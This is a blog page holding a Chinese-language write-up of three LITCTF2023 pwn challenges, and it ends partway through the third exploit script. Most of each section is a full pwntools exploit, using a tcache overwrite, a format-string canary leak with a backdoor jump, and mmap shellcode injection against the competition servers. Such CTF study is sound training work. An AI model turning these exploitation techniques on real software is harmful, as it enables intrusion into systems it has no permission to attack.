<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/06/LITCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/06/LITCTF2023/" class="post-title-link" itemprop="url">LITCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-09-06 00:16:56 / Modified: 00:18:08" itemprop="dateCreated datePublished" datetime="2023-09-06T00:16:56+08:00">2023-09-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="filereader"><a href="#filereader" class="headerlink" title="filereader"></a>filereader</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">2</span>d9ee3867b8472fc809b8d34c0e6b7fc68fa248c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>绕开这个 double free 就可以获取 flag：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;v6);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;v7);</span><br><span class="line">*v6 = v7;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>
<p>直接覆盖 tcache-&gt;bk 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./s1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;litctf.org&#x27;</span>,<span class="string">&#x27;31772&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x12C4)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(leak_addr-<span class="number">0x48</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="MyPet"><a href="#MyPet" class="headerlink" title="MyPet"></a>MyPet</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">845f</span>074a2f75e89b38ab4074668bcd859a39a3e3, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gets(format);</span><br><span class="line"><span class="built_in">printf</span>(format);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">gets(format);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用格式化字符串漏洞泄露后门地址和 canary，直接覆盖返回地址为后门地址</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./s&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;litctf.org&#x27;</span>,<span class="string">&#x27;31791&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1238)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">&quot;%13$p%11$p&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;0x&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x12ae</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;00&quot;</span>))*<span class="number">0x100</span></span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">back_door = pro_base + <span class="number">0x11EE</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">40</span>+p64(canary)+<span class="string">&quot;b&quot;</span>*<span class="number">8</span>+p64(back_door)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="SHA-Shell"><a href="#SHA-Shell" class="headerlink" title="SHA-Shell"></a>SHA-Shell</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=a473a0cf21f6ae4972ee4e29a626d49552b65dc4, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>mmap 有执行权限：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = mmap(<span class="number">0LL</span>, <span class="number">0x10000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">*result = lookup;</span><br><span class="line">result[<span class="number">1</span>] = store;</span><br><span class="line">result[<span class="number">2</span>] = helpMenu;</span><br><span class="line">result[<span class="number">3</span>] = infoBlurb;</span><br><span class="line">result[<span class="number">4</span>] = checkPrintable;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在 mmap 的空间上写 shellcode，然后想办法覆盖存放于 mmap 上的地址</p>
<p>由于程序会对 index 进行 hash 处理，导致不容易命中 mmap 上的地址，我的解决方法比较简单粗暴：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i+<span class="number">1</span>+<span class="number">62175</span>))</span><br><span class="line">    store(<span class="built_in">str</span>(i+<span class="number">1</span>+<span class="number">62175</span>),<span class="string">&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>最后发现 <code>74823</code> <code>122935</code> <code>200796</code> 成功输出可用数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lookup(<span class="built_in">str</span>(<span class="number">74823</span>))</span><br><span class="line">ru(<span class="string">&quot;Value for \&quot;74823\&quot;: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x1581</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br></pre></td></tr></table></figure>
<p>函数 <code>checkPrintable</code> 会过滤非可见字符，导致 shellcode 注入失败</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = mmap(<span class="number">0LL</span>, <span class="number">0x10000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">*result = lookup;</span><br><span class="line">result[<span class="number">1</span>] = store;</span><br><span class="line">result[<span class="number">2</span>] = helpMenu;</span><br><span class="line">result[<span class="number">3</span>] = infoBlurb;</span><br><span class="line">result[<span class="number">4</span>] = checkPrintable;</span><br></pre></td></tr></table></figure>
<p>我们可以将其覆盖为函数 <code>hexlifyPrint</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">hexlifyPrint</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样既可以泄露 mmap_addr，又可以解除 shellcode 的限制：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p16(printx % <span class="number">0x10000</span>) <span class="comment"># checkPrintable</span></span><br><span class="line">store(<span class="built_in">str</span>(<span class="number">200796</span>),payload)</span><br></pre></td></tr></table></figure>
<p>然后输入 shellcode，计算 shellcode 的地址</p>
<p>最后将 mmap_addr 上的函数指针覆盖为 shellcode_addr 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./x&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span 